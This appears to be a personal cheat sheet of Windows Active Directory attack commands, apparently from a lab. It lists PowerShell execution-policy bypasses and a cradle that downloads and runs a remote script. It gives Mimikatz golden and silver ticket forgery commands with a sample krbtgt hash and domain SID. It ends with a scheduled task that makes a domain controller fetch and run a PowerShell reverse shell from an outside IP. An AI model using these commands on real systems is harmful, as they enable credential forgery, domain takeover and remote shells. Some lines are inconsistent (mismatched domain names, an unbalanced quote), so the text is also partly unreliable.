# Commands

# bypass
Start PowerShell from cmd.exe:

powershell.exe -ep bypass

OR If already running-

Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

Set-ExecutionPolicy -Scope Process -ExecutionPolicy Restricted

$Env:PSExecutionPolicyPreference = 'Bypass'



# cradle
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')

# download
(new-object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/conma293/mvp/main/1.ps1", "C:\Windows\Temp\1.ps1")

# Tickets

NTLM == RC4

#Golden

Invoke-Mimikatz -Command '"kerberos::golden 
/User:DonaldDuck /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

#Silver
SPNs - https://adsecurity.org/?page_id=183

Invoke-Mimikatz -Command '"kerberos::golden 
/domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /target:dc01.ecorp.local /service:HOST 
/rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt"

schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Updater123" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.3.111:8080/Invoke-PowerShellTcp.ps1'')'"

schtasks /Run /S dc01.ecorp.moneycorp.local /TN "Updater123"
